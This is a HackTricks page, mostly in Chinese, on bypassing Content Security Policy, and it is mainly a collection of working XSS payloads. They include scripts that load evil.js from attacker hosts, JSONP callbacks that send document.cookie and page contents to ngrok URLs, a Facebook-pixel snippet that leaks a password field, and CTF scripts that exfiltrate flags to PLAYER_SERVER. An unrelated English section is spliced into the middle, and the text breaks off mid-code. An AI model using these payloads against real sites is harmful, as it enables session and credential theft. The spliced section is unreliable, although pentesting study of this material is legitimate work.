# 内容安全策略（CSP）绕过

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想看到您的**公司在HackTricks中被广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**上关注**我们。
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

加入[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy)服务器，与经验丰富的黑客和赏金猎人交流！

**黑客见解**\
参与深入探讨黑客的刺激和挑战的内容

**实时黑客新闻**\
通过实时新闻和见解及时了解快节奏的黑客世界

**最新公告**\
随时了解最新的赏金计划发布和重要平台更新

**加入我们的** [**Discord**](https://discord.com/invite/N3FrSbmwdy)，立即与顶尖黑客合作！

## 什么是CSP

内容安全策略（CSP）被认为是一种浏览器技术，主要旨在**防范跨站脚本（XSS）等攻击**。它通过定义和详细说明浏览器可以安全加载资源的路径和来源来发挥作用。这些资源包括各种元素，如图像、框架和JavaScript。例如，策略可能允许从同一域（self）加载和执行资源，包括内联资源和通过`eval`、`setTimeout`或`setInterval`等函数执行字符串代码。

CSP的实施通过**响应头**或将**元素嵌入HTML页面**中进行。根据此策略，浏览器会主动执行这些规定，并立即阻止检测到的任何违规行为。

* 通过响应头实施：
```
Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
```
* 通过 meta 标签实现：
```xml
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```
### Headers

CSP可以使用以下标头来强制执行或监控：

- `Content-Security-Policy`：强制执行CSP；浏览器会阻止任何违规行为。
- `Content-Security-Policy-Report-Only`：用于监控；报告违规行为但不阻止它们。适用于在预生产环境中进行测试。

### Defining Resources

CSP限制了加载活动和被动内容的来源，控制诸如内联JavaScript执行和使用`eval()`等方面。一个示例策略是：
```bash
default-src 'none';
img-src 'self';
script-src 'self' https://code.jquery.com;
style-src 'self';
report-uri /cspreport
font-src 'self' https://addons.cdn.mozilla.net;
frame-src 'self' https://ic.paypal.com https://paypal.com;
media-src https://videos.cdn.mozilla.net;
object-src 'none';
```
### 指令

* **script-src**: 允许特定来源的 JavaScript，包括 URL、内联脚本以及由事件处理程序或 XSLT 样式表触发的脚本。
* **default-src**: 在特定获取指令缺失时为获取资源设置默认策略。
* **child-src**: 指定 Web Workers 和嵌入式框架内容的允许资源。
* **connect-src**: 限制可以使用 fetch、WebSocket、XMLHttpRequest 等接口加载的 URL。
* **frame-src**: 限制框架的 URL。
* **frame-ancestors**: 指定哪些来源可以嵌入当前页面，适用于 `<frame>`、`<iframe>`、`<object>`、`<embed>` 和 `<applet>` 等元素。
* **img-src**: 定义图像的允许来源。
* **font-src**: 指定使用 `@font-face` 加载的字体的有效来源。
* **manifest-src**: 定义应用清单文件的允许来源。
* **media-src**: 定义加载媒体对象的允许来源。
* **object-src**: 定义 `<object>`、`<embed>` 和 `<applet>` 元素的允许来源。
* **base-uri**: 指定使用 `<base>` 元素加载的允许 URL。
* **form-action**: 列出表单提交的有效端点。
* **plugin-types**: 限制页面可以调用的 MIME 类型。
* **upgrade-insecure-requests**: 指示浏览器将 HTTP URL 重写为 HTTPS。
* **sandbox**: 应用类似于 `<iframe>` 的 sandbox 属性的限制。
* **report-to**: 指定违反策略时将发送报告的组。
* **worker-src**: 指定 Worker、SharedWorker 或 ServiceWorker 脚本的有效来源。
* **prefetch-src**: 指定将被获取或预获取的资源的有效来源。
* **navigate-to**: 通过任何方式（a、form、window.location、window.open 等）限制文档可以导航到的 URL。

### 来源

* `*`: 允许所有 URL，除了具有 `data:`、`blob:`、`filesystem:` 方案的 URL。
* `'self'`: 允许从相同域加载。
* `'data'`: 允许通过 data 方案加载资源（例如，Base64 编码的图像）。
* `'none'`: 阻止从任何来源加载。
* `'unsafe-eval'`: 允许使用 `eval()` 和类似方法，出于安全原因不建议使用。
* `'unsafe-hashes'`: 启用特定内联事件处理程序。
* `'unsafe-inline'`: 允许使用内联资源，如内联 `<script>` 或 `<style>`，出于安全原因不建议使用。
* `'nonce'`: 使用加密 nonce（一次性数字）的特定内联脚本的白名单。
* 如果您有 JS 限制执行，可以通过 `doc.defaultView.top.document.querySelector("[nonce]")` 在页面内获取已使用的 nonce，然后重用它来加载恶意脚本（如果使用了 strict-dynamic，任何允许的来源都可以加载新来源，因此不需要这样做），例如：

<details>

<summary>重用 nonce 加载脚本</summary>
```html
<!-- From https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/ -->
<img src=x ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)'>
```
</details>

* `'sha256-<hash>'`: 使用特定的 sha256 哈希值来允许脚本加载。
* `'strict-dynamic'`: 如果已经被 nonce 或哈希值列入白名单，允许从任何来源加载脚本。
* `'host'`: 指定特定的主机，如 `example.com`。
* `https:`: 限制只能使用 HTTPS 的 URL。
* `blob:`: 允许从 Blob URL（例如通过 JavaScript 创建的 Blob URL）加载资源。
* `filesystem:`: 允许从文件系统加载资源。
* `'report-sample'`: 在违规报告中包含违规代码的示例（用于调试）。
* `'strict-origin'`: 类似于 'self'，但确保源的协议安全级别与文档匹配（只有安全源才能从安全源加载资源）。
* `'strict-origin-when-cross-origin'`: 在进行同源请求时发送完整的 URL，但在跨源请求时只发送源。
* `'unsafe-allow-redirects'`: 允许加载将立即重定向到另一个资源的资源。不建议使用，因为会降低安全性。

## 不安全的 CSP 规则

### 'unsafe-inline'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-inline';
```
工作负载：`"/><script>alert(1);</script>`

#### self + 'unsafe-inline' 通过 Iframes

{% content-ref url="csp-bypass-self-+-unsafe-inline-with-iframes.md" %}
[csp-bypass-self-+-unsafe-inline-with-iframes.md](csp-bypass-self-+-unsafe-inline-with-iframes.md)
{% endcontent-ref %}

### 'unsafe-eval'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-eval';
```
有效的有效载荷：
```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```
### strict-dynamic

如果你可以以某种方式使一个**允许的JS代码创建一个新的脚本标签**在DOM中，因为一个允许的脚本正在创建它，**新的脚本标签将被允许执行**。

### 通配符 (\*)
```yaml
Content-Security-Policy: script-src 'self' https://google.com https: data *;
```
有效的有效载荷：
```markup
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```
### 缺乏 object-src 和 default-src

{% hint style="danger" %}
**看起来这个方法不再有效**
{% endhint %}
```yaml
Content-Security-Policy: script-src 'self' ;
```
有效的有效载荷：
```markup
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
```
### 文件上传 + 'self'

- 在某些情况下，您可能会遇到 Content Security Policy (CSP) 限制了您能够从哪里加载脚本或资源的情况。通常，CSP 中会包含 `'self'` 关键字，表示只允许从相同的源加载资源。

- 如果您能够上传文件并且在上传的文件中注入脚本，您可以尝试利用这一点来绕过 CSP。您可以尝试上传一个包含您控制的脚本的文件，然后通过该文件来加载您想要绕过 CSP 的脚本或资源。

- 请注意，这种方法可能会受到其他安全控制措施的限制，因此在实施时需要谨慎考虑。
```yaml
Content-Security-Policy: script-src 'self';  object-src 'none' ;
```
如果您可以上传一个JS文件，您可以绕过这个CSP：

有效载荷：
```markup
"/>'><script src="/uploads/picture.png.js"></script>
```
然而，服务器很可能正在**验证上传的文件**，并且只允许您**上传特定类型的文件**。

此外，即使您可以使用服务器接受的扩展名（如：_script.png_）在文件中上传**JS代码**，这也是不够的，因为一些服务器如apache服务器会**根据扩展名选择文件的MIME类型**，而像Chrome这样的浏览器将**拒绝执行应该是图像的内容中的Javascript**代码。"幸运的是"，存在一些错误。例如，从CTF中我学到**Apache不认识**_**.wave**_扩展名，因此不会使用类似audio/\*的**MIME类型**提供它。

从这里开始，如果您发现了XSS和文件上传，并且设法找到了**被误解的扩展名**，您可以尝试上传一个带有该扩展名和脚本内容的文件。或者，如果服务器正在检查上传文件的正确格式，可以创建一个多语言混合体（[这里有一些多语言混合体示例](https://github.com/Polydet/polyglot-database)）。

### Form-action

如果无法注入JS，您仍然可以尝试窃取例如凭据**注入一个表单操作**（并且可能期望密码管理器自动填充密码）。您可以在[**此报告中找到一个示例**](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp)。另外，请注意`default-src`不包括表单操作。

### 第三方端点 + ('unsafe-eval')

{% hint style="warning" %}
对于以下一些有效载荷，**甚至不需要`unsafe-eval`**。
{% endhint %}
```yaml
Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';
```
加载一个有漏洞的 Angular 版本并执行任意的 JS：
```xml
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>


"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>


"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>


With some bypasses from: https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
<iframe/ng-app/ng-csp/srcdoc="
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
</script>
<img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
>
```
#### 使用 Angular + 一个返回`window`对象的函数库的有效载荷（[查看此文章](https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/)）：

{% hint style="info" %}
该文章显示您可以从`cdn.cloudflare.com`（或任何其他允许的JS库仓库）**加载**所有**库**，执行每个库中添加的所有函数，并检查**哪些库的哪些函数返回`window`对象**。
{% endhint %}
```markup
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
<div ng-app ng-csp>
{{$on.curry.call().alert(1)}}
{{[].empty.call().alert([].empty.call().document.domain)}}
{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{$on.curry.call().alert('xss')}}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{[].erase.call().alert('xss')}}
</div>
```
## 从类名中的 Angular XSS：

### 攻击场景

在某些情况下，当用户输入的内容被直接用作 HTML 类名时，可能会导致 Angular 中的跨站脚本（XSS）攻击。

### 攻击向量

攻击者可以通过输入恶意的 HTML/JS 代码作为类名，然后当该类名被渲染到 Angular 模板中时，恶意代码将被执行。

### 漏洞利用

1. 创建一个带有恶意类名的 HTML 元素，如 `<div class="malicious-class" ></div>`。
2. 当该元素被渲染到 Angular 模板中时，恶意类名中的代码将被执行，从而实现 XSS 攻击。

### 预防措施

避免直接使用用户输入的内容作为 HTML 类名，应该对用户输入进行适当的过滤和编码，以防止恶意代码的注入。
```html
<div ng-app>
<strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```
#### 滥用谷歌 reCAPTCHA JS 代码

根据[**这篇 CTF 解密**](https://blog-huli-tw.translate.goog/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/?\_x\_tr\_sl=es&\_x\_tr\_tl=en&\_x\_tr\_hl=es&\_x\_tr\_pto=wapp#noteninja-3-solves)，您可以滥用 [https://www.google.com/recaptcha/](https://www.google.com/recaptcha/) 在 CSP 中执行任意 JS 代码，绕过 CSP：
```html
<div
ng-controller="CarouselController as c"
ng-init="c.init()"
>
&#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
<div carousel><div slides></div></div>

<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
```
更多来自[**这篇文章的有效载荷**](https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/)：
```html
<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script>

<!-- Trigger alert -->
<img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>

<!-- Reuse nonce -->
<img src=x ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)'>
```
#### 滥用 www.google.com 进行开放式重定向

以下URL将重定向到 example.com（来自[这里](https://www.landh.tech/blog/20240304-google-hack-50000/)）:
```
https://www.google.com/amp/s/example.com/
```
### 滥用 \*.google.com/script.google.com

可以滥用Google Apps Script在script.google.com内的页面中接收信息。就像在[这份报告](https://embracethered.com/blog/posts/2023/google-bard-data-exfiltration/)中所做的那样。

### 第三方端点 + JSONP
```http
Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
```
在这种情况下，`script-src` 被设置为 `self` 和一个特定的在白名单中的域名，可以通过使用 JSONP 来绕过。JSONP 端点允许使用不安全的回调方法，这使得攻击者可以执行 XSS，有效载荷如下：
```markup
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
```

```html
https://www.youtube.com/oembed?callback=alert;
<script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"></script>
```
[**JSONBee**](https://github.com/zigoo0/JSONBee) **包含了用于绕过不同网站CSP的JSONP端点。**

如果**受信任的端点包含一个开放重定向**，将会出现相同的漏洞，因为如果初始端点受信任，则重定向也会受信任。

### 第三方滥用

正如在[以下帖子](https://sensepost.com/blog/2023/dress-code-the-talk/#bypasses)中所述，许多第三方域可能会被允许在CSP的某个地方使用，可以被滥用来窃取数据或执行JavaScript代码。其中一些第三方是：

| 实体            | 允许的域名                               | 能力       |
| ----------------- | -------------------------------------------- | ------------ |
| Facebook          | www.facebook.com, \*.facebook.com            | 窃取        |
| Hotjar            | \*.hotjar.com, ask.hotjar.io                 | 窃取        |
| Jsdelivr          | \*.jsdelivr.com, cdn.jsdelivr.net            | 执行         |
| Amazon CloudFront | \*.cloudfront.net                            | 窃取, 执行  |
| Amazon AWS        | \*.amazonaws.com                             | 窃取, 执行  |
| Azure Websites    | \*.azurewebsites.net, \*.azurestaticapps.net | 窃取, 执行  |
| Salesforce Heroku | \*.herokuapp.com                             | 窃取, 执行  |
| Google Firebase   | \*.firebaseapp.com                           | 窃取, 执行  |

如果在目标的CSP中发现任何允许的域名，那么您可能能够通过注册第三方服务来绕过CSP，从而将数据窃取到该服务或执行代码。

例如，如果您发现以下CSP：
```
Content-Security-Policy​: default-src 'self’ www.facebook.com;​
```
### Content Security Policy (CSP) Bypass

---

#### Introduction

In this section, we will discuss various techniques to bypass Content Security Policy (CSP) restrictions.

#### What is Content Security Policy (CSP)?

Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks, such as Cross Site Scripting (XSS) and data injection attacks. CSP works by defining the sources from which certain types of content can be loaded on a web page.

#### Bypassing CSP

There are several ways to bypass CSP restrictions, including:

1. **Inline Script Execution**: By finding ways to execute scripts inline, bypassing CSP restrictions that disallow inline scripts.
2. **External Script Execution**: Loading external scripts from unauthorized sources by exploiting misconfigurations or vulnerabilities.
3. **Data Injection**: Injecting malicious data into the page to bypass CSP restrictions that prevent certain types of data from being loaded.
4. **Policy Manipulation**: Finding ways to manipulate or disable the CSP policy altogether.

By understanding these techniques, you can effectively test the security of web applications and help developers improve their CSP configurations.
```
Content-Security-Policy​: connect-src www.facebook.com;​
```
你应该能够像以往使用[Google Analytics](https://www.humansecurity.com/tech-engineering-blog/exfiltrating-users-private-data-using-google-analytics-to-bypass-csp)/[Google Tag Manager](https://blog.deteact.com/csp-bypass/)那样，窃取数据。在这种情况下，你可以按照以下一般步骤操作：

1. 在这里创建一个Facebook开发者账户。
2. 创建一个新的“Facebook登录”应用程序并选择“网站”。
3. 转到“设置 -> 基本信息”并获取你的“应用ID”。
4. 在你想要从中窃取数据的目标网站上，你可以通过直接使用Facebook SDK小工具“fbq”以及“customEvent”和数据有效负载来窃取数据。
5. 转到你的应用程序“事件管理器”，选择你创建的应用程序（请注意，事件管理器可以在类似于此URL的位置找到：https://www.facebook.com/events\_manager2/list/pixel/\[app-id]/test\_events）。
6. 选择“测试事件”选项卡，查看“你的”网站发送的事件。

然后，在受害者端，执行以下代码初始化Facebook跟踪像素，指向攻击者的Facebook开发者账户应用程序ID，并发出一个自定义事件，如下所示：
```JavaScript
fbq('init', '1279785999289471');​ // this number should be the App ID of the attacker's Meta/Facebook account
fbq('trackCustom', 'My-Custom-Event',{​
data: "Leaked user password: '"+document.getElementById('user-password').innerText+"'"​
});
```
### 通过RPO（相对路径覆盖）进行绕过 <a href="#bypass-via-rpo-relative-path-overwrite" id="bypass-via-rpo-relative-path-overwrite"></a>

除了前面提到的重定向绕过路径限制之外，还有一种称为相对路径覆盖（RPO）的技术可用于某些服务器。

例如，如果CSP允许路径`https://example.com/scripts/react/`，则可以通过以下方式绕过：
```html
<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
```
浏览器最终将加载`https://example.com/scripts/angular/angular.js`。

这是因为对于浏览器来说，您正在加载位于`https://example.com/scripts/react/`下的名为`..%2fangular%2fangular.js`的文件，这与CSP兼容。

因此，它们将对其进行解码，有效地请求`https://example.com/scripts/react/../angular/angular.js`，这等同于`https://example.com/scripts/angular/angular.js`。

通过**利用浏览器和服务器之间URL解释的不一致性，可以绕过路径规则**。

解决方案是在服务器端不将`%2f`视为`/`，确保浏览器和服务器之间的一致解释以避免此问题。

在线示例：[ ](https://jsbin.com/werevijewa/edit?html,output)[https://jsbin.com/werevijewa/edit?html,output](https://jsbin.com/werevijewa/edit?html,output)

### Iframes JS执行

{% content-ref url="../xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](../xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### 缺少**base-uri**

如果缺少**base-uri**指令，您可以滥用它执行[**悬挂标记注入**](../dangling-markup-html-scriptless-injection/)。

此外，如果页面使用相对路径加载脚本（如`<script src="/js/app.js">`）使用**Nonce**，您可以滥用**base** **标签**使其从**您自己的服务器加载**脚本以实现XSS。\
如果易受攻击的页面使用**httpS**加载，请在base中使用httpS网址。
```html
<base href="https://www.attacker.com/">
```
### AngularJS 事件

一种名为内容安全策略（CSP）的特定策略可能会限制JavaScript事件。然而，AngularJS引入了自定义事件作为一种替代方案。在事件中，AngularJS提供了一个名为`$event`的独特对象，引用了原生浏览器事件对象。这个`$event`对象可以被利用来规避CSP。值得注意的是，在Chrome中，`$event/event`对象具有一个`path`属性，其中包含一个对象数组，涉及事件执行链，其中`window`对象始终位于最后。这种结构对于沙箱逃逸策略至关重要。

通过将这个数组指向`orderBy`过滤器，可以对其进行迭代，利用终端元素（`window`对象）来触发类似`alert()`的全局函数。下面演示的代码片段阐明了这个过程：
```xml
<input%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27>#x
?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```
这段代码突出了使用 `ng-focus` 指令来触发事件，利用 `$event.path|orderBy` 操作 `path` 数组，并利用 `window` 对象执行 `alert()` 函数，从而揭示 `document.cookie`。

**在** [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) **中查找其他 Angular 绕过方法**

### AngularJS 和白名单域
```
Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
```
### CSP绕过

一个在Angular JS应用程序中为脚本加载列入白名单的CSP策略可以通过调用回调函数和特定的易受攻击类别来绕过。有关此技术的更多信息可以在这个[git存储库](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh\*t,-it's-CSP!%22)上找到。

有效载荷：
```html
<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>

<!-- no longer working -->
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)">
```
其他JSONP任意执行端点可以在[**这里**](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt)找到（其中一些已被删除或修复）

### 通过重定向绕过

当CSP遇到服务器端重定向时会发生什么？如果重定向导致到一个不允许的不同源，它仍然会失败。

然而，根据[CSP规范4.2.2.3. 路径和重定向](https://www.w3.org/TR/CSP2/#source-list-paths-and-redirects)中的描述，如果重定向导致到不同路径，它可以绕过原始限制。

这里有一个例子：
```html
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Security-Policy" content="script-src http://localhost:5555 https://www.google.com/a/b/c/d">
</head>
<body>
<div id=userContent>
<script src="https://https://www.google.com/test"></script>
<script src="https://https://www.google.com/a/test"></script>
<script src="http://localhost:5555/301"></script>
</div>
</body>
</html>
```
如果CSP设置为`https://www.google.com/a/b/c/d`，由于路径被考虑在内，`/test`和`/a/test`脚本都将被CSP阻止。

然而，最终的`http://localhost:5555/301`将在服务器端**重定向到`https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)//`**。由于这是一个重定向，**路径不被考虑**，因此**脚本可以被加载**，从而绕过路径限制。

通过这种重定向，即使完全指定了路径，仍将被绕过。

因此，最佳解决方案是确保网站没有任何开放的重定向漏洞，并且在CSP规则中没有可以被利用的域。

### 使用悬挂标记绕过CSP

阅读[此处的方法](../dangling-markup-html-scriptless-injection/)。

### 'unsafe-inline'; img-src \*; 通过XSS
```
default-src 'self' 'unsafe-inline'; img-src *;
```
`'unsafe-inline'` 意味着可以在代码中执行任何脚本（XSS 可以执行代码），`img-src *` 意味着可以在网页中使用来自任何资源的任何图像。

您可以通过图像来绕过此 CSP，通过图像外泄数据（在这种情况下，XSS 滥用 CSRF，在一个机器人可访问的页面中包含一个 SQLi，并通过图像提取标志）：
```javascript
<script>fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new Image().src='http://PLAYER_SERVER/?'+_)</script>
```
From: [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

您还可以滥用此配置来**加载插入图像内部的JavaScript代码**。例如，如果页面允许从Twitter加载图像。您可以**制作**一个**特殊图像**，将其**上传**到Twitter，并滥用“**unsafe-inline**”来**执行**一个JS代码（作为常规XSS），该代码将**加载**图像，**提取**其中的**JS**并**执行** **它**：[https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/](https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/)

### 使用Service Workers

Service workers的**`importScripts`**函数不受CSP限制：

{% content-ref url="../xss-cross-site-scripting/abusing-service-workers.md" %}
[abusing-service-workers.md](../xss-cross-site-scripting/abusing-service-workers.md)
{% endcontent-ref %}

### 策略注入

**研究：** [**https://portswigger.net/research/bypassing-csp-with-policy-injection**](https://portswigger.net/research/bypassing-csp-with-policy-injection)

#### Chrome

如果您发送的**参数**被**粘贴到** **策略**的**声明**中，则可以以某种方式**更改**使**其无效**的**策略**。您可以使用以下任何绕过方式之一允许脚本'unsafe-inline'：
```bash
script-src-elem *; script-src-attr *
script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'
```
因为这个指令会**覆盖现有的 script-src 指令**。\
你可以在这里找到一个例子：[http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E)

#### Edge

在 Edge 中更简单。如果你可以在 CSP 中添加这个：**`;_`**，**Edge** 将**丢弃**整个**策略**。\
例子：[http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert(1)%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert\(1\)%3C/script%3E)

### img-src \*; 通过 XSS（iframe）- 时间攻击

注意缺少指令 `'unsafe-inline'`\
这次你可以让受害者通过**XSS**加载一个在**你控制下**的页面，使用一个 `<iframe`。这次你将让受害者访问你想要提取信息（**CSRF**）的页面。你无法访问页面的内容，但如果你可以**控制页面加载所需的时间**，你就可以提取所需的信息。

这次一个**标志**将被提取，每当通过 SQLi **正确猜测一个字符**时，由于 sleep 函数，**响应**会**花费更多时间**。然后，你将能够提取标志：
```html
<!--code from https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle -->
<iframe name=f id=g></iframe> // The bot will load an URL with the payload
<script>
let host = "http://x-oracle-v1.nn9ed.ka0labs.org";
function gen(x) {
x = escape(x.replace(/_/g, '\\_'));
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`;
}

function gen2(x) {
x = escape(x);
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag='${x}'and%201=sleep(0.1)%23`;
}

async function query(word, end=false) {
let h = performance.now();
f.location = (end ? gen2(word) : gen(word));
await new Promise(r => {
g.onload = r;
});
let diff = performance.now() - h;
return diff > 300;
}

let alphabet = '_abcdefghijklmnopqrstuvwxyz0123456789'.split('');
let postfix = '}'

async function run() {
let prefix = 'nn9ed{';
while (true) {
let i = 0;
for (i;i<alphabet.length;i++) {
let c = alphabet[i];
let t =  await query(prefix+c); // Check what chars returns TRUE or FALSE
console.log(prefix, c, t);
if (t) {
console.log('FOUND!')
prefix += c;
break;
}
}
if (i==alphabet.length) {
console.log('missing chars');
break;
}
let t = await query(prefix+'}', true);
if (t) {
prefix += '}';
break;
}
}
new Image().src = 'http://PLAYER_SERVER/?' + prefix; //Exfiltrate the flag
console.log(prefix);
}

run();
</script>
```
### 通过书签工具

这种攻击需要一些社会工程学，攻击者**说服用户将链接拖放到浏览器的书签工具上**。这个书签工具会包含**恶意的 JavaScript** 代码，当拖放或点击时会在当前网页窗口的上下文中执行，**绕过 CSP 并允许窃取敏感信息**，比如 cookies 或令牌。

有关更多信息[**请查看原始报告**](https://socradar.io/csp-bypass-unveiled-the-hidden-threat-of-bookmarklets/)。

### 通过限制 CSP 绕过 CSP

在[**这个 CTF 解密**](https://github.com/google/google-ctf/tree/master/2023/web-biohazard/solution)中，通过在允许的 iframe 中注入一个更严格的 CSP 来绕过 CSP，该 CSP 禁止加载特定的 JS 文件，然后通过**原型污染**或**DOM 篡改**允许**滥用不同的脚本加载任意脚本**。

您可以使用**`csp`**属性**限制 iframe 的 CSP**：

{% code overflow="wrap" %}
```html
<iframe src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]" csp="script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'"></iframe>
```
{% endcode %}

在[**这个CTF解密**](https://github.com/aszx87410/ctf-writeups/issues/48)中，通过**HTML注入**可以更加**限制**一个**CSP**，从而禁用阻止CSTI的脚本，因此**漏洞变得可利用。**\
可以使用**HTML meta标签**使CSP更加严格，内联脚本可以被禁用**移除**允许它们的**入口**，并通过**sha启用特定的内联脚本**：
```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self'
'unsafe-eval' 'strict-dynamic'
